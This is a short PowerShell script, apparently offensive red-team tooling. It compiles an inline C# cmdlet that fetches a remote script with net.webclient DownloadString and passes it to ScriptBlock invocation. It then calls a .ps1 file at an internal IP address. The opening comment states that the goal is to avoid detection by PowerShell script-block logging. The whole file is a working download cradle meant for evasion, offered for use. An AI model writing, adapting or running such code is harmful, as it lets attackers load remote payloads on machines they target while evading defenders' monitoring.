#Might be a way to move the code to a file and load/precompile to avoid detection on ScriptBlock

$code = @"
    using System;
    using System.Management.Automation;

    [Cmdlet("Don", "Low")]
    public class DonLow : Cmdlet
    {
        [Parameter(Position =0)]
        public  String Cmd  { get; set; }

        public void Do(string url)
        {
        String command = "(new-object net.webclient).DownloadString('" + url + "')";
         ScriptBlock scriptBlock = ScriptBlock.Create(command);
         scriptBlock.Invoke();
         }
    }
"@

    Add-Type $code

    $cmdlet = [DonLow]::new()
    $cmdlet.Do("https://10.107.67.244/rto-fs/cd-home.ps1")